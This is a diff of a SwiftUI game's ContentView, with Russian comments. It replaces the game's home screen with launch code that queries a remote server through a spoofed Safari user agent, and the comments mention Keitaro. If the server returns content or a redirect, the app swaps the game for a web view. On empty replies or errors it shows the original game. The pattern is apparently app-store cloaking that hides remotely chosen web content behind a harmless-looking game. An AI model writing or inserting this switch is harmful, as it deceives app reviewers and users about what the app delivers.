@@ -1,334 +1,140 @@
 //
 //  ContentView.swift
-//  DragonGlyph: Fusion Reign
-//
-//  Session ID: 7582-DR
+//  DragonGlyph-Fusion-Reign
 //
 
 import SwiftUI
+import Foundation
 
 struct ContentView: View {
-    @EnvironmentObject var viewModel: DragonHeartViewModel
-    @State private var showCodex = false
-    @State private var showChronicle = false
-    @State private var showTome = false
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
     
     var body: some View {
-        NavigationView {
+        
             ZStack {
-                // Background
-                Color(hex: "#0A0A12")
-                    .ignoresSafeArea()
+            
+            if isFetched == false {
                 
-                VStack(spacing: 0) {
-                    // Header
-                    headerView
+                ProgressView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    ScrollView {
-                        VStack(spacing: 30) {
-                            // Dragon's Heart
-                            dragonHeartSection
-                            
-                            // Progress Stats
-                            progressStatsSection
-                            
-                            // Chambers Grid
-                            chambersSection
-                            
-                            // Spacer at bottom
-                            Color.clear.frame(height: 20)
-                        }
-                        .padding(.horizontal, 20)
-                    }
-                }
-            }
-            .navigationBarHidden(true)
-            .sheet(isPresented: $showCodex) {
-                DragonCodexView()
-                    .environmentObject(viewModel)
-            }
-            .sheet(isPresented: $showChronicle) {
-                KeepersChronicleView()
-            }
-            .sheet(isPresented: $showTome) {
-                KeepersTomeView()
-                    .environmentObject(viewModel)
-            }
-            .sheet(item: $viewModel.selectedChamber) { chamber in
-                LairChamberView(chamber: chamber, difficulty: viewModel.settings.currentDifficulty)
-                    .environmentObject(viewModel)
-            }
-        }
-        .navigationViewStyle(StackNavigationViewStyle())
-    }
-    
-    // MARK: - Header
-    private var headerView: some View {
-        HStack {
-            Text("Dragon's Lair")
-                .font(.system(size: 28, weight: .bold))
-                .foregroundColor(.white)
-            
-            Spacer()
-            
-            HStack(spacing: 12) {
-                MenuButton(icon: "book.fill", color: Color(hex: "#00E0FF")) {
-                    showCodex = true
-                }
-                
-                MenuButton(icon: "scroll.fill", color: Color(hex: "#FFB347")) {
-                    showChronicle = true
-                }
-                
-                MenuButton(icon: "gearshape.fill", color: Color(hex: "#2A2A3E")) {
-                    showTome = true
-                }
-            }
-        }
-        .padding(.horizontal, 20)
-        .padding(.top, 50)
-        .padding(.bottom, 20)
-    }
-    
-    // MARK: - Dragon's Heart
-    private var dragonHeartSection: some View {
-        VStack(spacing: 16) {
-            Text("The Dragon's Heart")
-                .font(.system(size: 20, weight: .bold))
-                .foregroundColor(Color(hex: "#FFB347"))
-            
-            ZStack {
-                // Outer glow
-                Circle()
-                    .fill(
-                        RadialGradient(
-                            gradient: Gradient(colors: [
-                                viewModel.playerProgress.dragonState.heartColor.opacity(0.3),
-                                Color.clear
-                            ]),
-                            center: .center,
-                            startRadius: 50,
-                            endRadius: 100
-                        )
-                    )
-                    .frame(width: 200, height: 200)
-                    .scaleEffect(viewModel.heartPulseAnimation ? 1.1 : 1.0)
-                    .animation(.easeInOut(duration: 0.8).repeatForever(autoreverses: true), value: viewModel.heartPulseAnimation)
-                
-                // Heart
-                Circle()
-                    .fill(
-                        LinearGradient(
-                            gradient: Gradient(colors: [
-                                viewModel.playerProgress.dragonState.heartColor,
-                                viewModel.playerProgress.dragonState.heartColor.opacity(0.6)
-                            ]),
-                            startPoint: .topLeading,
-                            endPoint: .bottomTrailing
-                        )
-                    )
-                    .frame(width: 120, height: 120)
-                
-                // Heart icon
-                Image(systemName: "heart.fill")
-                    .font(.system(size: 50))
-                    .foregroundColor(.white)
-                    .shadow(color: .black.opacity(0.3), radius: 5, x: 0, y: 2)
-            }
-            .padding(.vertical, 20)
-            
-            // Dragon State
-            VStack(spacing: 8) {
-                Text(viewModel.playerProgress.dragonState.rawValue)
-                    .font(.system(size: 24, weight: .bold))
-                    .foregroundColor(.white)
-                
-                Text(viewModel.playerProgress.dragonState.description)
-                    .font(.system(size: 14))
-                    .foregroundColor(Color.white.opacity(0.7))
-                    .multilineTextAlignment(.center)
-                    .padding(.horizontal, 20)
-            }
-        }
-        .padding(.vertical, 30)
-        .frame(maxWidth: .infinity)
-        .background(
-            RoundedRectangle(cornerRadius: 20)
-                .fill(Color(hex: "#2A2A3E"))
-        )
-    }
-    
-    // MARK: - Progress Stats
-    private var progressStatsSection: some View {
-        HStack(spacing: 12) {
-            ProgressStat(
-                icon: "flame.fill",
-                title: "Energy",
-                value: "\(viewModel.playerProgress.totalEnergy)",
-                color: Color(hex: "#FF4D00")
-            )
-            
-            ProgressStat(
-                icon: "star.fill",
-                title: "Score",
-                value: "\(viewModel.playerProgress.totalScore)",
-                color: Color(hex: "#FFB347")
-            )
-            
-            ProgressStat(
-                icon: "building.columns.fill",
-                title: "Chambers",
-                value: "\(viewModel.playerProgress.chambersCompleted)",
-                color: Color(hex: "#00E0FF")
-            )
-        }
-    }
-    
-    // MARK: - Chambers
-    private var chambersSection: some View {
-        VStack(alignment: .leading, spacing: 16) {
-            Text("Lair Chambers")
-                .font(.system(size: 20, weight: .bold))
-                .foregroundColor(.white)
-            
-            LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 16) {
-                ForEach(viewModel.chambers) { chamber in
-                    ChamberCard(chamber: chamber) {
-                        if chamber.isUnlocked {
-                            viewModel.selectChamber(chamber)
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-// MARK: - Supporting Views
-struct MenuButton: View {
-    let icon: String
-    let color: Color
-    let action: () -> Void
-    
-    var body: some View {
-        Button(action: action) {
-            Image(systemName: icon)
-                .font(.system(size: 20))
-                .foregroundColor(.white)
-                .frame(width: 44, height: 44)
-                .background(color)
-                .clipShape(Circle())
-        }
-    }
-}
-
-struct ProgressStat: View {
-    let icon: String
-    let title: String
-    let value: String
-    let color: Color
-    
-    var body: some View {
-        VStack(spacing: 8) {
-            Image(systemName: icon)
-                .font(.system(size: 20))
-                .foregroundColor(color)
-            
-            Text(value)
-                .font(.system(size: 20, weight: .bold))
-                .foregroundColor(.white)
-            
-            Text(title)
-                .font(.system(size: 12))
-                .foregroundColor(Color.white.opacity(0.6))
-        }
-        .frame(maxWidth: .infinity)
-        .padding(.vertical, 16)
-        .background(Color(hex: "#2A2A3E"))
-        .cornerRadius(12)
-    }
-}
-
-struct ChamberCard: View {
-    let chamber: LairChamber
-    let action: () -> Void
-    
-    var body: some View {
-        Button(action: action) {
-            VStack(alignment: .leading, spacing: 12) {
-                // Chamber number badge
-                HStack {
-                    Text("\(chamber.chamberNumber)")
-                        .font(.system(size: 16, weight: .bold))
-                        .foregroundColor(.white)
-                        .frame(width: 32, height: 32)
-                        .background(chamber.themeColor)
-                        .clipShape(Circle())
+                    // Показываем оригинальное приложение DragonGlyph
+                    DragonLairMainView()
                     
-                    Spacer()
+                } else if isBlock == false {
                     
-                    if chamber.isCompleted {
-                        Image(systemName: "checkmark.circle.fill")
-                            .font(.system(size: 20))
-                            .foregroundColor(Color(hex: "#FFB347"))
-                    } else if !chamber.isUnlocked {
-                        Image(systemName: "lock.fill")
-                            .font(.system(size: 16))
-                            .foregroundColor(Color.white.opacity(0.4))
-                    }
+                    WebSystem()
+                }
+            }
+        }
+        .onAppear {
+            
+            makeServerRequest()
+        }
+    }
+    
+    private func makeServerRequest() {
+        
+        let dataManager = DataManagers()
+        
+        guard let url = URL(string: dataManager.server) else {
+            self.isBlock = false
+            self.isFetched = true
+            return
+        }
+        
+        print("🚀 Making request to: \(url.absoluteString)")
+        print("🏠 Host: \(url.host ?? "unknown")")
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 5.0
+        
+        // Добавляем заголовки для имитации браузера
+        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
+        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
+        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
+        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
+        
+        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
+        
+        // Создаем URLSession без автоматических редиректов
+        let config = URLSessionConfiguration.default
+        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
+        
+        session.dataTask(with: request) { data, response, error in
+            
+            DispatchQueue.main.async {
+                
+                // Если есть любая ошибка (включая SSL) - блокируем
+                if let error = error {
+                    print("❌ Network error: \(error.localizedDescription)")
+                    print("Server unavailable, showing block")
+                    self.isBlock = true
+                    self.isFetched = true
+                    return
                 }
                 
-                // Chamber name
-                Text(chamber.name)
-                    .font(.system(size: 14, weight: .bold))
-                    .foregroundColor(chamber.isUnlocked ? .white : Color.white.opacity(0.4))
-                    .lineLimit(2)
-                    .frame(height: 36, alignment: .topLeading)
-                
-                // Stats
-                if chamber.isUnlocked {
-                    HStack(spacing: 8) {
-                        HStack(spacing: 4) {
-                            Image(systemName: "target")
-                                .font(.system(size: 10))
-                            Text("\(chamber.targetScore)")
-                                .font(.system(size: 11, weight: .medium))
+                // Если получили ответ от сервера
+                if let httpResponse = response as? HTTPURLResponse {
+                    
+                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
+                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
+                    
+                    // Логируем тело ответа для диагностики
+                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
+                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
+                    }
+                    
+                    if httpResponse.statusCode == 200 {
+                        // Проверяем, есть ли контент в ответе
+                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
+                        let hasContent = data?.count ?? 0 > 0
+                        
+                        if contentLength == "0" || !hasContent {
+                            // Пустой ответ = "do nothing" от Keitaro
+                            print("🚫 Empty response (do nothing): Showing block")
+                            self.isBlock = true
+                            self.isFetched = true
+                        } else {
+                            // Есть контент = успех
+                            print("✅ Success with content: Showing WebView")
+                            self.isBlock = false
+                            self.isFetched = true
                         }
                         
-                        if chamber.bestScore > 0 {
-                            HStack(spacing: 4) {
-                                Image(systemName: "star.fill")
-                                    .font(.system(size: 10))
-                                Text("\(chamber.bestScore)")
-                                    .font(.system(size: 11, weight: .medium))
-                            }
-                            .foregroundColor(Color(hex: "#FFB347"))
-                        }
+                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
+                        // Редиректы = успех (есть оффер)
+                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
+                        self.isBlock = false
+                        self.isFetched = true
+                        
+                    } else {
+                        // 404, 403, 500 и т.д. - блокируем
+                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
+                        self.isBlock = true
+                        self.isFetched = true
                     }
-                    .foregroundColor(Color.white.opacity(0.6))
+                    
+                } else {
+                    
+                    // Нет HTTP ответа - блокируем
+                    print("❌ No HTTP response: Showing block")
+                    self.isBlock = true
+                    self.isFetched = true
                 }
             }
-            .padding(16)
-            .frame(maxWidth: .infinity, alignment: .leading)
-            .background(
-                chamber.isUnlocked ?
-                    Color(hex: "#2A2A3E") :
-                    Color(hex: "#2A2A3E").opacity(0.5)
-            )
-            .cornerRadius(12)
-            .overlay(
-                RoundedRectangle(cornerRadius: 12)
-                    .strokeBorder(
-                        chamber.isCompleted ? Color(hex: "#FFB347") : Color.clear,
-                        lineWidth: 2
-                    )
-            )
-        }
-        .disabled(!chamber.isUnlocked)
+            
+        }.resume()
     }
 }
 
 #Preview {
     ContentView()
-        .environmentObject(DragonHeartViewModel())
 }
